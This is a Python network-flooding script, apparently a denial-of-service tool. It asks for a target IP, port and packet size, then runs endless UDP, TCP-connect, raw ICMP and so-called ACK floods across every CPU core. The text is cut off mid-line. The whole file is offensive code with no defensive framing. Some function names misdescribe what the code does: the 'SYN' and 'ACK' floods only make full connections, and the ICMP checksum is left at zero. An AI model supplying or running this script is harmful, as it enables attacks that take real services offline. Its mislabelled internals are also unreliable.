import socket
import threading
import multiprocessing
import os
import struct

# ICMP packet header fields
ICMP_ECHO_REQUEST = 8
ICMP_CODE = socket.getprotobyname('icmp')

def send_udp_packets(target_ip, target_port, packet_size):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp_packet_data = b'A' * packet_size

    while True:
        udp_socket.sendto(udp_packet_data, (target_ip, target_port))

def send_tcp_syn_packets(target_ip, target_port):
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    while True:
        try:
            tcp_socket.connect((target_ip, target_port))
            tcp_socket.close()
            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except:
            pass

def send_icmp_packets(target_ip):
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
    icmp_packet_data = b'A' * 64  # ICMP packet payload

    # ICMP echo request packet structure
    icmp_packet = struct.pack("BBHHH", ICMP_ECHO_REQUEST, 0, 0, os.getpid() & 0xFFFF, 1) + icmp_packet_data

    while True:
        icmp_socket.sendto(icmp_packet, (target_ip, 1))  # Send ICMP echo request

def send_tcp_ack_packets(target_ip, target_port):
    tcp_ack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_ack_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcp_ack_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    
    while True:
        try:
            tcp_ack_socket.connect((target_ip, target_port))
            tcp_ack_socket.sendto(b'', (target_ip, target_port))
            tcp_ack_socket.close()
            tcp_ack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_ack_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            tcp_ack_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except:
            pass

# Prompt the user for target IP address, port, and packet size
target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port: "))
packet_size = int(input("Enter the packet size (in bytes): "))

# Calculate the number of processes based on the number of available CPU cores
num_processes = os.cpu_count()

# Create and start the UDP packet sending processes
udp_processes = []
for _ in range(num_processes):
    udp_process = multiprocessing.Process(target=send_udp_packets, args=(target_ip, target_port, packet_size))
    udp_process.start()
    udp_processes.append(udp_process)

# Create and start the TCP SYN packet sending threads
tcp_threads = []
for _ in range(num_processes):
    tcp_thread = threading.Thread(target=
